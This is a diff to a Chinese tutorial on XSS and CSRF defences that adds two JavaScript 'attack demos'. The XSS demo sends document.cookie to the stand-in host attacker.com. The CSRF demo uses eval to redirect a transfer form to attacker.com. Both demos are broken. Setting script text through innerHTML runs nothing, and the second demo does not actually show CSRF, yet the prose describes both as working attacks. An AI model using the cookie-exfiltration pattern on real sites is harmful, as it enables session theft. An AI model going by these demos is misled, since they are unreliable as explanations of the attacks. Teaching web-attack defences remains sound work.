@@ -30,6 +30,33 @@ CSP 也是解决 XSS 攻击的一个强力手段
 
 - 要防范 XSS 攻击，需要在服务器端过滤脚本代码，将一些危险的元素和属性去掉或对元素进行HTML实体编码。
 
+```javascript
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS Attack Demo</title>
+</head>
+<body>
+  <h1>XSS Attack Demo</h1>
+  <div id="content"></div>
+  <script src="payload.js"></script>
+</body>
+</html>
+
+
+// payload.js
+const maliciousScript = `
+  const xhr = new XMLHttpRequest();
+  xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true);
+  xhr.send();
+`;
+
+document.getElementById('content').innerHTML = maliciousScript;
+
+```
+在上述示例中，恶意脚本payload.js被注入到页面中。该脚本通过XMLHttpRequest发送GET请求，将页面中的Cookie信息发送给攻击者控制的服务器。
+
 
 ### XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。
 
@@ -48,8 +75,6 @@ CSP 也是解决 XSS 攻击的一个强力手段
 
 ## CSRF：Cross-site request forgery
 
-
-
 ```dotnetcli
 1.  用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
 2.  在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
@@ -57,6 +82,34 @@ CSP 也是解决 XSS 攻击的一个强力手段
 4.  网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
 5.  浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 
 ```
+
+```javascript
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack Demo</title>
+</head>
+<body>
+  <h1>CSRF Attack Demo</h1>
+  <form id="transfer-form" action="http://bank.com/transfer" method="POST">
+    <input type="hidden" name="amount" value="10000">
+    <input type="submit" value="Transfer">
+  </form>
+  <script src="payload.js"></script>
+</body>
+</html>
+// payload.js
+const maliciousScript = `
+  const form = document.getElementById('transfer-form');
+  form.action = 'http://attacker.com/steal-data';
+  form.submit();`;
+
+eval(maliciousScript);
+```
+在上述示例中，恶意脚本payload.js被执行。该脚本修改了表单transfer-form的目标地址为攻击者控制的服务器，并提交表单。当用户点击"Transfer"按钮时，实际上会向攻击者服务器发送用户的敏感数据。
+
+
 防御 CSRF 攻击有多种手段：
 
 不使用cookie
